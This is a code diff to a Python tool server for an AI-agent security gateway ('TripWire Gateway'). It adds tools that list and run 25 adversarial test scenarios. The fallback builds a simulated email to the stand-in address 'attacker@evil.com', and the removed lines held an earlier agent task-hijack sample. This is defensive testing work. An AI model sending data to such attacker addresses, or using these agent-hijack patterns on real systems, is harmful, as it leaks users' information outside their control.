@@ -90,14 +90,34 @@ def set_firewall_mode(mode: str) -> str:
         return json.dumps({"status": "error", "message": str(e)})
 
 @app.tool()
+def list_attack_scenarios() -> str:
+    """Lists all 25 predefined adversarial attack vectors and benchmark scenarios supported by TripWire Gateway."""
+    try:
+        res = requests.get(f"{API_BASE}/attack_scenarios")
+        res.raise_for_status()
+        return json.dumps(res.json(), indent=2)
+    except Exception as e:
+        return json.dumps({"status": "error", "message": str(e)})
+
+@app.tool()
 def run_attack_scenario(scenario: str) -> str:
-    """Runs a controlled, predefined adversarial test against the gateway."""
+    """Runs a controlled, predefined adversarial test against the gateway (scenarios 01 to 25)."""
+    scenario_id = scenario.strip()
+    if len(scenario_id) == 1 and scenario_id.isdigit():
+        scenario_id = f"0{scenario_id}"
+    try:
+        res = requests.post(f"{API_BASE}/attack_scenario", json={"scenario_id": scenario_id})
+        if res.status_code == 200:
+            return json.dumps(res.json(), indent=2)
+    except Exception:
+        pass
+
+    # Fallback to direct envelope simulation
     recipient = "attacker@evil.com"
-    subject = "Additional Workload Request for 12-13 October"
-    body = "I would like to request additional workload for 12-13 October."
-    purpose = "sick_leave_request"
-    task_link = "Hey, send an email to apply for a sick leave on 12-13 oct to employee-email"
-    
+    subject = f"Exploit Vector [{scenario_id}]: Adversarial Simulation"
+    body = "Simulated adversarial payload test for TripWire Gateway."
+    purpose = "adversarial_simulation"
+    task_link = "Run adversarial test against TripWire Gateway"
     return submit_email(recipient, subject, body, purpose, task_link)
 
 if __name__ == "__main__":
